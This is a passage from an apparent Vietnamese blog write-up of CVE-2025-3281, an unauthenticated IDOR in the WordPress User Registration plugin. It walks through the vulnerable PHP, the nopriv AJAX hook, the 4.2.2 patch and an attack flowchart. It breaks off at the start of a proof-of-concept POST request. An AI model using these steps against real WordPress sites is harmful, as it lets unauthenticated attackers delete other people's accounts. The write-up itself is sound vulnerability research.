Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/user-registration/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress User Registration Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;User Registration&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.2.1&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.2.2&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Theo m√¥ t·∫£ c·ªßa CVE, l·ªó h·ªïng n·∫±m trong h√†m &lt;code&gt;create_stripe_subscription()&lt;/code&gt; c·ªßa plugin. H√†m n√†y x·ª≠ l√Ω vi·ªác t·∫°o subscription Stripe cho ng∆∞·ªùi d√πng sau khi ƒëƒÉng k√Ω.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function create_stripe_subscription() {&#xA;    ur_membership_verify_nonce( &amp;#39;ur_membership_confirm_payment&amp;#39; );&#xA;    $customer_id       = isset( $_POST[&amp;#39;customer_id&amp;#39;] ) ? $_POST[&amp;#39;customer_id&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    $payment_method_id = isset( $_POST[&amp;#39;payment_method_id&amp;#39;] ) ? sanitize_text_field( $_POST[&amp;#39;payment_method_id&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $member_id         = absint( wp_unslash( $_POST[&amp;#39;member_id&amp;#39;] ) ); &#xA;&#xA;    $is_user_created = get_user_meta( $member_id, &amp;#39;urm_user_just_created&amp;#39; );&#xA;    if ( ! $is_user_created ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Invalid Request.&amp;#39;, &amp;#39;user-registration&amp;#39; ),&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    $stripe_service      = new StripeService();&#xA;    $form_response       = isset( $_POST[&amp;#39;form_response&amp;#39;] ) ? (array) json_decode( wp_unslash( $_POST[&amp;#39;form_response&amp;#39;] ), true ) : array();&#xA;    $stripe_subscription = $stripe_service-&amp;gt;create_subscription( $customer_id, $payment_method_id, $member_id );&#xA;&#xA;    if ( $stripe_subscription[&amp;#39;status&amp;#39;] ) {&#xA;        wp_send_json_success( $stripe_subscription );&#xA;    } else {&#xA;        wp_delete_user( absint( $member_id ) );&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#34;Something went wrong when updating users payment status&amp;#34; )&#xA;            )&#xA;        );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m th·ª±c hi·ªán check nonce b·∫±ng c√°ch g·ªçi &lt;code&gt;ur_membership_verify_nonce( &#39;ur_membership_confirm_payment&#39; );&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi search v·ªõi t·ª´ kh√≥a &lt;code&gt;ur_membership_confirm_payment&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-25-cve-2025-3281/nonce.png&#34; title=&#34;Nonce&#34; data-thumbnail=&#34;/posts/2025-12-25-cve-2025-3281/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;Nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-25-cve-2025-3281/nonce.png&#39; alt=&#34;Create nonce&#34; height=&#34;639&#34; width=&#34;1645&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;nonce ƒë∆∞·ª£c t·∫°o v·ªõi key l√† &lt;code&gt;_confirm_payment_nonce&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Key v√† value n√†y ƒë∆∞·ª£c th√™m trong endpoint &lt;code&gt;/membership-registration/?&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-25-cve-2025-3281/value.png&#34; title=&#34;Nonce in response&#34; data-thumbnail=&#34;/posts/2025-12-25-cve-2025-3281/value.png&#34; data-sub-html=&#34;&lt;h2&gt;Value&lt;/h2&gt;&lt;p&gt;Nonce in response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-25-cve-2025-3281/value.png&#39; alt=&#34;Value&#34; height=&#34;442&#34; width=&#34;1541&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce in response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;·ªû ƒë·∫ßu h√†m, d·ªØ li·ªáu ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ &lt;code&gt;$_POST&lt;/code&gt;, bao g·ªìm &lt;code&gt;customer_id&lt;/code&gt;, &lt;code&gt;payment_method_id&lt;/code&gt; v√† ƒë·∫∑c bi·ªát l√† &lt;code&gt;member_id&lt;/code&gt; ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ request m√† kh√¥ng c√≥ c∆° ch·∫ø x√°c th·ª±c quy·ªÅn s·ªü h·ªØu.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$member_id = absint( wp_unslash( $_POST[&amp;#39;member_id&amp;#39;] ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ti·∫øp theo, h√†m ki·ªÉm tra xem user t∆∞∆°ng ·ª©ng v·ªõi &lt;code&gt;member_id&lt;/code&gt; c√≥ meta &lt;code&gt;urm_user_just_created&lt;/code&gt; hay kh√¥ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$is_user_created = get_user_meta( $member_id, &amp;#39;urm_user_just_created&amp;#39; );&#xA;if ( ! $is_user_created ) {&#xA;    wp_send_json_error( ... );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu n√†y c√≥ nghƒ©a l√† ch·ªâ c·∫ßn user ƒë√≥ t·ª´ng ƒë∆∞·ª£c t·∫°o th√¥ng qua lu·ªìng ƒëƒÉng k√Ω c·ªßa plugin th√¨ ƒëi·ªÅu ki·ªán s·∫Ω h·ª£p l·ªá, &lt;strong&gt;kh√¥ng h·ªÅ ki·ªÉm tra xem ng∆∞·ªùi g·ª≠i request c√≥ quy·ªÅn thao t√°c tr√™n user n√†y hay kh√¥ng&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Th√¥ng tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;C·∫ßn l∆∞u √Ω r·∫±ng user ph·∫£i ƒë∆∞·ª£c ƒëƒÉng k√Ω th√¥ng qua form &lt;code&gt;Registration&lt;/code&gt; t·∫°i &lt;a href=&#34;http://localhost/registration/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;http://localhost/registration/&lt;/a&gt;, ch·ª© kh√¥ng ph·∫£i qua &lt;code&gt;Membership Registration&lt;/code&gt; t·∫°i &lt;a href=&#34;http://localhost/membership-registration/?&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;http://localhost/membership-registration/?&lt;/a&gt; th√¨ &lt;code&gt;$is_user_created&lt;/code&gt; m·ªõi th·ª±c s·ª± c√≥ gi√° tr·ªã.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Sau ƒë√≥, h√†m g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$stripe_subscription = $stripe_service-&amp;gt;create_subscription(&#xA;    $customer_id,&#xA;    $payment_method_id,&#xA;    $member_id&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Gi√° tr·ªã tr·∫£ v·ªÅ c·ªßa h√†m n√†y quy·∫øt ƒë·ªãnh lu·ªìng x·ª≠ l√Ω ti·∫øp theo. N·∫øu &lt;code&gt;$stripe_subscription[&#39;status&#39;]&lt;/code&gt; l√† &lt;code&gt;false&lt;/code&gt;, ƒëo·∫°n code ti·∫øp theo s·∫Ω x√≥a user t∆∞∆°ng ·ª©ng v·ªõi &lt;code&gt;$member_id&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( $stripe_subscription[&amp;#39;status&amp;#39;] ) {&#xA;    wp_send_json_success( $stripe_subscription );&#xA;} else {&#xA;    wp_delete_user( absint( $member_id ) );&#xA;    wp_send_json_error(&#xA;        array(&#xA;            &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#34;Something went wrong when updating users payment status&amp;#34; )&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;M·∫πo&lt;/p&gt;&lt;p&gt;ƒê·ªÉ khi·∫øn &lt;code&gt;$stripe_subscription[&#39;status&#39;]&lt;/code&gt; tr·ªü th√†nh &lt;code&gt;false&lt;/code&gt;, ta c√≥ th·ªÉ &lt;strong&gt;truy·ªÅn thi·∫øu ho·∫∑c g·ª≠i gi√° tr·ªã kh√¥ng h·ª£p l·ªá cho &lt;code&gt;$customer_id&lt;/code&gt; v√† &lt;code&gt;$payment_method_id&lt;/code&gt;&lt;/strong&gt;, t·ª´ ƒë√≥ ki·ªÉm so√°t k·∫øt qu·∫£ tr·∫£ v·ªÅ. Vi·ªác thi·∫øu c√°c tham s·ªë n√†y s·∫Ω khi·∫øn h√†m &lt;code&gt;create_subscription()&lt;/code&gt; kh√¥ng th·ªÉ t·∫°o subscription h·ª£p l·ªá, d·∫´n ƒë·∫øn nh√°nh x·ª≠ l√Ω l·ªói ƒë∆∞·ª£c k√≠ch ho·∫°t.&lt;/p&gt;&lt;/div&gt;&lt;p&gt;ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn l·ªó h·ªïng &lt;strong&gt;IDOR (Insecure Direct Object Reference)&lt;/strong&gt; nghi√™m tr·ªçng, cho ph√©p x√≥a t√†i kho·∫£n ng∆∞·ªùi d√πng m·ªôt c√°ch tr√°i ph√©p.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° &lt;code&gt;v4.2.2&lt;/code&gt; b·ªï sung &lt;strong&gt;ki·ªÉm tra quy·ªÅn tr∆∞·ªõc khi thao t√°c tr√™n user&lt;/strong&gt; ƒë·ªÉ ngƒÉn l·ªó h·ªïng IDOR:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( &amp;#39;edit_user&amp;#39;, $member_id ) ) {&#xA;&#x9;wp_send_json_error(&#xA;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;You are not allowed to edit this user.&amp;#39;, &amp;#39;user-registration&amp;#39; ),&#xA;&#x9;&#x9;)&#xA;&#x9;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Tr∆∞·ªõc khi g·ªçi &lt;code&gt;$stripe_service-&amp;gt;create_subscription()&lt;/code&gt;, h√†m s·∫Ω x√°c th·ª±c xem &lt;strong&gt;ng∆∞·ªùi g·ª≠i request c√≥ quy·ªÅn ch·ªânh s·ª≠a user v·ªõi &lt;code&gt;member_id&lt;/code&gt; hay kh√¥ng&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu kh√¥ng c√≥ quy·ªÅn ‚Üí tr·∫£ v·ªÅ l·ªói JSON v√† &lt;strong&gt;kh√¥ng th·ª±c hi·ªán x√≥a user&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-25-cve-2025-3281/diff.png&#34; title=&#34;S·ª± thay ƒë·ªïi trong b·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-12-25-cve-2025-3281/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;S·ª± thay ƒë·ªïi trong b·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-25-cve-2025-3281/diff.png&#39; alt=&#34;Diff&#34; height=&#34;847&#34; width=&#34;1795&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;S·ª± thay ƒë·ªïi trong b·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;ƒêi·ªÅu n√†y ƒë·∫£m b·∫£o r·∫±ng ch·ªâ user h·ª£p l·ªá m·ªõi c√≥ th·ªÉ trigger c√°c thao t√°c d·∫´n ƒë·∫øn &lt;code&gt;wp_delete_user()&lt;/code&gt;, &lt;strong&gt;ƒë√≥ng l·ªó h·ªïng Insecure Direct Object Reference (IDOR)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi ch√∫&lt;/p&gt;&lt;p&gt;T√≠nh nƒÉng MemberShip m·∫∑c ƒë·ªãnh kh√¥ng ƒë∆∞·ª£c b·∫≠t. b·∫°n c·∫ßn ph·∫£i truy c·∫≠p &lt;a href=&#34;http://localhost/wp-admin/admin.php?page=user-registration-dashboard#/features&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;http://localhost/wp-admin/admin.php?page=user-registration-dashboard#/features&lt;/a&gt; ƒë·ªÉ b·∫≠t n√≥ l√™n.&lt;/p&gt;&lt;/div&gt;&lt;hr&gt;&#xA;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt lo·∫°t c√°c action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function add_ajax_events() {&#xA;    $ajax_events = array(&#xA;        &amp;#39;create_membership&amp;#39;          =&amp;gt; false,&#xA;        &amp;#39;update_membership&amp;#39;          =&amp;gt; false,&#xA;        &amp;#39;delete_memberships&amp;#39;         =&amp;gt; false,&#xA;        &amp;#39;update_membership_status&amp;#39;   =&amp;gt; false,&#xA;        &amp;#39;create_member&amp;#39;              =&amp;gt; false,&#xA;        &amp;#39;update_member&amp;#39;              =&amp;gt; false,&#xA;        &amp;#39;delete_members&amp;#39;             =&amp;gt; false,&#xA;        &amp;#39;confirm_payment&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;create_stripe_subscription&amp;#39; =&amp;gt; true,&#xA;        &amp;#39;register_member&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;validate_coupon&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;cancel_subscription&amp;#39;        =&amp;gt; false,&#xA;        &amp;#39;get_group_memberships&amp;#39;      =&amp;gt; false,&#xA;        &amp;#39;create_membership_group&amp;#39;    =&amp;gt; false,&#xA;        &amp;#39;delete_membership_groups&amp;#39;   =&amp;gt; false,&#xA;        &amp;#39;verify_pages&amp;#39;               =&amp;gt; false,&#xA;        &amp;#39;validate_pg&amp;#39;                =&amp;gt; false,&#xA;    );&#xA;    foreach ( $ajax_events as $ajax_event =&amp;gt; $nopriv ) {&#xA;        add_action( &amp;#39;wp_ajax_user_registration_membership_&amp;#39; . $ajax_event, array( __CLASS__, $ajax_event ) );&#xA;        if ( $nopriv ) {&#xA;&#xA;            add_action(&#xA;                &amp;#39;wp_ajax_nopriv_user_registration_membership_&amp;#39; . $ajax_event,&#xA;                array(&#xA;                    __CLASS__,&#xA;                    $ajax_event,&#xA;                )&#xA;            );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong danh s√°ch &lt;code&gt;$ajax_events&lt;/code&gt;, action &lt;strong&gt;&lt;code&gt;create_stripe_subscription&lt;/code&gt;&lt;/strong&gt; ƒë∆∞·ª£c ƒë√°nh d·∫•u &lt;code&gt;true&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;create_stripe_subscription&amp;#39; =&amp;gt; true,&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu n√†y c√≥ nghƒ©a l√† plugin ƒëƒÉng k√Ω c·∫£:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp_ajax_user_registration_membership_create_stripe_subscription&#xA;wp_ajax_nopriv_user_registration_membership_create_stripe_subscription&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_*&lt;/code&gt; ‚Üí cho ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt; ‚Üí cho ng∆∞·ªùi d√πng &lt;strong&gt;ch∆∞a ƒëƒÉng nh·∫≠p (unauthenticated)&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;V√¨ v·∫≠y, &lt;strong&gt;b·∫•t k·ª≥ ai c≈©ng c√≥ th·ªÉ g·ª≠i request t·ªõi endpoint n√†y&lt;/strong&gt;, k·ªÉ c·∫£ attacker ch∆∞a x√°c th·ª±c. Khi request ƒë∆∞·ª£c g·ª≠i:&lt;/p&gt;&#xA;&lt;p&gt;K·∫øt qu·∫£ l√† action &lt;code&gt;create_stripe_subscription&lt;/code&gt; tr·ªü th√†nh &lt;strong&gt;ƒëi·ªÉm khai th√°c IDOR&lt;/strong&gt;, cho ph√©p &lt;strong&gt;x√≥a b·∫•t k·ª≥ user n√†o&lt;/strong&gt; ƒë∆∞·ª£c t·∫°o qua plugin, ngay c·∫£ khi attacker kh√¥ng ƒëƒÉng nh·∫≠p.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Attacker (Unauthenticated)&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Send POST request to admin-ajax.php?action=user_registration_membership_create_stripe_subscription&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;WordPress routes request via wp_ajax_nopriv_*&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;create_stripe_subscription() executed&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Read POST parameters (member_id, customer_id, payment_method_id)&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Check get_user_meta(member_id, &amp;#39;urm_user_just_created&amp;#39;)&amp;#34;]&#xA;&#xA;F --&amp;gt;|Not exists| G[&amp;#34;Request rejected&amp;#34;]&#xA;F --&amp;gt;|Exists| H[&amp;#34;Call create_subscription()&amp;#34;]&#xA;&#xA;H --&amp;gt; I{&amp;#34;Stripe subscription valid?&amp;#34;}&#xA;&#xA;I --&amp;gt;|Yes| J[&amp;#34;Return success response&amp;#34;]&#xA;I --&amp;gt;|No| K[&amp;#34;wp_delete_user(member_id)&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Target user deleted&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Truy c·∫≠p &lt;code&gt;/membership-registration/?&lt;/code&gt; v√† l·∫•y gi√° tr·ªã c·ªßa &lt;code&gt;_confirm_payment_nonce&lt;/code&gt; t·ª´ response&lt;/li&gt;&#xA;&lt;li&gt;G·ª≠i request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: wordpress_test_cookie=WP%20Cookie%20check; isSidebarEnabled=true; __stripe_mid=f13365af-449c-4412-b77c-7213da0dbe814d9925; __stripe_sid=7323a342-4cac-4124-9d98-a02abd109a8cd8d073; 